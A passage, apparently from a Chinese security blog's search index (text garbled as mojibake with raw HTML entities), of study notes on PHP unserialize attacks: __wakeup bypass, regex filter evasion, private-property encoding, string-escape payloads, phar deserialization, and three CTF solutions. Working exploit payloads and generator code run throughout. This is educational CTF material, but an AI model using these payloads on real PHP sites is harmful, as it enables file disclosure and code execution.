onerror=alert(1)&gt;&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$c = new A();$c = serialize($c);echo $c;?&gt; è¾“å‡ºO:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125; Oè¡¨ç¤ºç±»åž‹æ˜¯object 1è¡¨ç¤ºobjectå¯¹åº”çš„ç±»çš„åå­—çš„é•¿åº¦ä¸º1 â€œAâ€è¡¨ç¤ºç±»å 1è¡¨ç¤ºå¯¹åº”å˜é‡çš„ä¸ªæ•° sè¡¨ç¤ºåºåˆ—åŒ–åŽä¸ºå­—ç¬¦ä¸² 4è¡¨ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦ â€œtest&quot;è¡¨ç¤ºè¡¨ç¤ºå˜é‡å sè¡¨ç¤ºå˜é‡testçš„ç±»åž‹ 28è¡¨ç¤ºå˜é‡testçš„é•¿åº¦ &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;è¡¨ç¤ºå˜é‡testçš„å€¼ å¦‚æžœ__wakeupä¸­ä¸æ˜¯echo()ï¼Œè€Œæ˜¯eval()ï¼Œé‚£ä¹ˆå°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œå±å®³å°±æ›´å¤§äº†ã€‚ wakeupç»•è¿‡ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åŽï¼Œå¦‚æžœå…¶å±žæ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•° ä¾‹ï¼šåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶flag.phpå’Œtest.php test.phpæºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; æž„é€ åºåˆ—åŒ–ä»£ç  1234567891011&lt;?phpclass A&#123; function __construct()&#123; $this-&gt;file = &quot;flag.php&quot;; &#125;&#125;$a = new A;$b = serialize($a);print_r($b);?&gt; è¾“å‡ºï¼š 1O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; å¦‚æžœç›´æŽ¥è¿›è¡Œæ­£å¸¸çš„ååºåˆ—åŒ–çš„è¯ï¼Œå³ http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} é¡µé¢æ²¡æœ‰å…¶å®ƒå˜åŒ–ï¼Œå› ä¸ºåœ¨ä½¿ç”¨unserialize()çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨__wakeupï¼Œå°†fileæ›¿æ¢ä¸ºå½“å‰è·¯å¾„ phpåœ¨è§£æžå±žæ€§é•¿åº¦çš„æ—¶å€™ï¼Œè‹¥æ˜¯å‡ºé”™ å°†O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;æ”¹ä¸º O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; å®ƒå¹¶ä¸ä¼šç»ˆæ­¢ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œï¼Œä½†ä¸ä¼šè°ƒç”¨__wakeup() ç„¶åŽåœ¨é”€æ¯å¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨__destruct()å‡½æ•°ï¼Œé«˜äº®æ˜¾ç¤ºflag.php exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; OCç»•è¿‡å¯¹test.phpè¿›è¡Œä¿®æ”¹ å¯¹ä¼ è¿›æ¥çš„fileè¿›è¡Œè¿‡æ»¤ 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯¹fileè¿›è¡Œäº†è¿‡æ»¤ å½“é‡åˆ° å­—æ¯Oæˆ–C åŠ ä¸Š:ï¼Œå†åŠ ä¸Šä¸€æ®µæ•°å­—å’Œ:ï¼ŒåŽé¢çš„ i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ æ—¶ï¼Œåˆ™dieæŽ‰ã€‚ è¯¥æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„éƒ¨åˆ†ä¸ºï¼šO:1: è‹¥åœ¨ä¸­é—´æ’å…¥ä¸€äº›å­—ç¬¦ï¼Œå°±å¯ä»¥è®©å®ƒåŒ¹é…ä¸å®Œå…¨ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é… å¯¹äºŽæ•°å­— 1 æ¥è¯´ï¼Œ+1 å’Œ 1 æ—¶ä¸€æ ·çš„ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡ ä½†åœ¨URLä¼ å‚ä¸­ï¼Œä¼šè¿›è¡Œè§£ç ï¼Œä¼šæŠŠåŠ å·ï¼ˆ+ï¼‰å˜æˆç©ºæ ¼ï¼Œæ‰€ä»¥åº”ç”¨+çš„URLç¼–ç ï¼š%2bä»£æ›¿ å³ï¼š O:%2b1: exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ç§æœ‰å±žæ€§ç»•è¿‡phpä¸­çš„è®¿é—®ç±»åž‹ï¼ˆpublicï¼Œprivateï¼Œprotectedï¼‰ public å…¬æœ‰ä¿®é¥°ç¬¦ï¼Œç±»ä¸­çš„æˆå‘˜æ²¡æœ‰è®¿é—®é™åˆ¶ï¼Œæ‰€æœ‰å¤–éƒ¨æˆå‘˜éƒ½å¯ä»¥è®¿é—®ï¼ˆè¯»å’Œå†™ï¼‰è¿™ä¸ªç±»æˆå‘˜ï¼ˆåŒ…æ‹¬æˆå‘˜å±žæ€§å’Œæˆå‘˜æ–¹æ³•ï¼‰ã€‚ private ç§æœ‰ä¿®é¥°ç¬¦ï¼Œè¢«å®šä¹‰ä¸ºprivateçš„æˆå‘˜ï¼Œå¯¹äºŽåŒä¸€ä¸ªç±»é‡Œçš„æ‰€æœ‰æˆå‘˜æ˜¯å¯è§çš„ï¼Œå³æ²¡æœ‰è®¿é—®é™åˆ¶ï¼›ä½†å¯¹äºŽè¯¥ç±»çš„å¤–éƒ¨ä»£ç æ—¶ä¸å…è®¸æ”¹å˜ç”šè‡³è¯»æ“ä½œçš„ï¼Œå¯¹äºŽè¯¥ç±»çš„å­ç±»ï¼Œä¹Ÿä¸èƒ½è®¿é—®privateä¿®é¥°çš„æˆå‘˜ã€‚ protected ä¿æŠ¤æˆå‘˜ä¿®é¥°ç¬¦ï¼Œè¢«ä¿®é¥°ä¸ºprotectedçš„æˆå‘˜ä¸èƒ½è¢«è¯¥ç±»çš„å¤–éƒ¨ä»£ç è®¿é—®ã€‚ä½†æ˜¯å¯¹äºŽè¯¥ç±»çš„å­ç±»æœ‰è®¿é—®æƒé™ï¼Œå¯ä»¥è¿›è¡Œå±žæ€§ã€æ–¹æ³•çš„è¯»åŠå†™æ“ä½œã€‚ public è¡¨ç¤ºå…¨å±€ï¼Œç±»å†…éƒ¨å¤–éƒ¨å­ç±»éƒ½å¯ä»¥è®¿é—®ï¼›private è¡¨ç¤ºç§æœ‰çš„ï¼Œåªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ï¼›protected è¡¨ç¤ºå—ä¿æŠ¤çš„ï¼Œåªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®ï¼› 123456789&lt;?phpclass test&#123; public $test1 = &quot;hello&quot; private $test2 = &quot;hello&quot;; protected $test3 = &quot;hello&quot;;&#125;$test = new test();echo serialize($test); ?&gt; testç±»å®šä¹‰äº†ä¸‰ä¸ªä¸åŒç±»åž‹(å…¬æœ‰ï¼Œç§æœ‰ï¼Œä¿æŠ¤)ï¼Œä½†æ˜¯å€¼ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œåºåˆ—åŒ–è¾“å‡ºçš„å€¼ä¸ç›¸åŒ privateå±žæ€§åºåˆ—åŒ–ä¸ºï¼š%00ç±»å%00å˜é‡åï¼Œå¯¹äºŽtest2æ¥è¯´ï¼Œåºåˆ—åŒ–åŽçš„é•¿åº¦åˆ™å˜ä¸º11 protectedå±žæ€§åºåˆ—åŒ–ä¸ºï¼š%00*%00å˜é‡åï¼Œå¯¹äºŽtest3æ¥è¯´ï¼Œåºåˆ—åŒ–åŽçš„é•¿åº¦åˆ™å˜ä¸º8 %00æ˜¯ä¸å¯è§å­—ç¬¦ å¯¹test.phpç»§ç»­è¿›è¡Œä¿®æ”¹ å°†publicæ”¹ä¸ºprivate 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; private $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; åºåˆ—åŒ–å¸¦privateå±žæ€§çš„file &#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; å°†fileæ”¹ä¸º%00A%00fileï¼Œå¯¹åº”çš„é•¿åº¦æ”¹ä¸º7 å³ï¼š {s:7:â€%00A%00fileâ€;s:8:â€flag.phpâ€;} exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125; å­—ç¬¦ä¸²é€ƒé€¸åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œtest.phpå’Œflag.php test.phpæºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021&lt;?phperror_reporting(255);class A&#123; public $filename = __FILE__; public function __destruct()&#123; highlight_file($this-&gt;filename); &#125;&#125;function waf($s)&#123; return preg_replace(&#x27;/flag/i&#x27;, &#x27;index&#x27;, $s);&#125;if(isset($_REQUEST[&#x27;x&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;x&#x27;]))&#123; $a = [ 0 =&gt; $_REQUEST[&#x27;x&#x27;], 1 =&gt; &quot;1&quot; ]; @unserialize(waf(serialize($a)));&#125;else&#123; new A();&#125;?&gt; æž„é€ payloadï¼š é¦–å…ˆè¦æœ‰ä¸ª&quot;;ä½¿å‰é¢çš„å­—ç¬¦ä¸²é—­åˆ æŽ¥ä¸‹æ¥æ˜¯å¸¸è§„çš„åºåˆ—åŒ–åŽçš„æ•°ç»„å…ƒç´  i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; ä½†åœ¨waf()å‡½æ•°ä¸­ï¼Œå¯¹åºåˆ—åŒ–åŽçš„$aè¿›è¡Œæ›¿æ¢ï¼Œæ‰€ä»¥å°†sæ”¹ä¸ºSï¼Œå°†flag.phpæ”¹ä¸ºåå…­è¿›åˆ¶çš„\\66\\6C\\61\\67\\2E\\70\\68\\70ï¼Œå³ i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125; æœ€åŽå†åŠ ä¸Š&#125;ä½¿å‰é¢æ•°ç»„açš„&#123;é—­åˆ æ‰€ä»¥åˆèµ·æ¥æ˜¯ &quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 12345678&lt;?php$a = [ 0 =&gt; &#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(serialize($a));?&gt; è¾“å‡º a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; æ‰€ä»¥è¯¥æ®µå­—ç¬¦ä¸²æœ‰65ä¸ªå­—ç¬¦ åˆ©ç”¨waf()å‡½æ•°å°†flagæ›¿æ¢ä¸ºindexä¼šå¢žåŠ ä¸€ä¸ªå­—ç¬¦ï¼Œæž„é€ 65ä¸ªflag 1python -c print(&#x27;flag&#x27;*65) å°†è¾“å‡ºç»“æžœå’Œå‰é¢çš„å­—ç¬¦ä¸²æ‹¼æŽ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°payload 1flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; é™„ï¼š éªŒè¯payloadæ˜¯å¦æ­£ç¡® 123456789101112131415&lt;?phpfunction waf($a)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;index&#x27;, $a);&#125;$a = [ 0 =&gt; &#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(waf(serialize($a)));echo &quot;&lt;br&gt;&quot;;print_r(unserialize(waf(serialize($a))));?&gt; è¾“å‡ºç»“æžœï¼š 12345678910a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;Array( [0] &#x3D;&gt; __PHP_Incomplete_Class Object ( [__PHP_Incomplete_Class_Name] &#x3D;&gt; A [filename] &#x3D;&gt; flag.php )) 1python -c &quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot; è¾“å‡ºï¼š325 pharååºåˆ—åŒ–(ä¸å¤ªæ‡‚pharååºåˆ—åŒ–æ€Žä¹ˆç”¨ï¼Œè¿™éƒ¨åˆ†æ‘˜è‡ªhttps://paper.seebug.org/680/) pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§åŽ‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«åŽ‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±žæ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚ 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //åŽç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub $o = new TestObject(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦åŽ‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; å¯ä»¥æ˜Žæ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ï¼š æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æžpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åŽå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š phar_test1.php 12345678910&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/test.txt&#x27;; file_get_contents($filename); ?&gt; å…¶ä»–å‡½æ•°å½“ç„¶ä¹Ÿæ˜¯å¯è¡Œçš„ï¼š phar_test2.php 1234567891011&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/a_random_string&#x27;; file_exists($filename); //...... ?&gt; å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æŽ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä¸€äº›ä¹‹å‰çœ‹èµ·æ¥â€œäººç•œæ— å®³â€çš„å‡½æ•°ä¹Ÿå˜å¾—â€œæš—è—æ€æœºâ€ï¼Œæžå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ã€‚ é¢˜ç›®unserialize11234567891011&lt;?php show_source(__FILE__); class XianZhi&#123; public $name; function __destruct()&#123; echo file_get_contents($this-&gt;name); &#125; &#125; unserialize($_GET[&#x27;a&#x27;]);?&gt; æž„é€ åºåˆ—åŒ–ä»£ç  12345678&lt;?phpclass XianZhi&#123; public $name = &#x27;/flag&#x27;;&#125;$a = new XianZhi();echo serialize($a);?&gt;//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125; unserialize2OCç»•è¿‡ã€wake upç»•è¿‡ 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;index.php&quot;);&#125;?&gt; è¿™é‡Œé¦–å…ˆæœ‰ä¸¤ä¸ªè¦ç»•è¿‡çš„ç‚¹ ç¬¬ä¸€ä¸ªç‚¹æ˜¯__wakeup()ï¼Œå› ä¸ºè¿™é‡Œæ­£å¸¸ååºåˆ—åŒ–ä¼šå†™æ­»$this-&gt;ï¬leå±žæ€§ä¸º index.phpï¼Œä½†æ˜¯phpå­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ¼æ´žï¼ˆCVE-2016-7124ï¼‰ï¼Œå½“å®žé™…å¯¹è±¡ä¸ç­‰äºŽååºåˆ—åŒ–çš„å¯¹è±¡æ•°æ—¶å€™ä¼šç»•è¿‡wakeup()ã€‚ ç¬¬äºŒä¸ªç‚¹æ˜¯æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„æ­£åˆ™åŒ¹é…çš„æ„æ€æ˜¯å¦‚æžœåœ¨varå˜é‡ä¸­å­˜åœ¨O/C:æ•°å­—(O:æ•°å­—æˆ–è€…C:æ•°å­—è¿™æ ·çš„å½¢å¼)å°±dieæŽ‰ï¼Œè¿™é‡ŒåŒ¹é…çš„æ˜¯O:4ï¼Œç›´æŽ¥ä½¿ç”¨+å·å½“åšç©ºæ ¼å³å¯ç»•è¿‡ï¼Œå³O:+4å³å¯ç»•è¿‡ã€‚ æž„é€ åºåˆ—åŒ–ä»£ç  123456789101112131415&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125;&#125;$a = new Demo(&#x27;f15g_1s_here.php&#x27;);$a = serialize($a).&quot;\\n&quot;;$a = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$a);$a = str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$a);echo base64_encode($a);?&gt;//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo= unserialize3ç§æœ‰å±žæ€§ç»•è¿‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; ord() å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚ file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ è¦åˆ©ç”¨read()çš„file_get_contents()è¯»å–flag.phpï¼Œå³/flag æ‰€ä»¥process()çš„$op==â€2â€ï¼Œç„¶åŽé€šè¿‡output()è¾“å‡º 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;/flag&quot;; protected $content = &quot;Hello World!&quot;;&#125;$a = new FileHandler;$b = serialize($a);echo $b;?&gt; æŠŠè¾“å‡ºçš„$bé€‚å½“ä¿®æ”¹ï¼Œå¾—åˆ°payload 1&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\\00*\\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;","categories":[{"name":"ä¿¡æ¯å®‰å…¨","slug":"ä¿¡æ¯å®‰å…¨","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]}],"categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä¿¡æ¯å®‰å…¨","slug":"ä¿¡æ¯å®‰å…¨","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"å…¶å®ƒ","slug":"å…¶å®ƒ","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"},{"name":"æ¯”èµ›writeup","slug":"æ¯”èµ›writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"},{"name":"å…¶å®ƒ","slug":"å…¶å®ƒ","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"},{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]}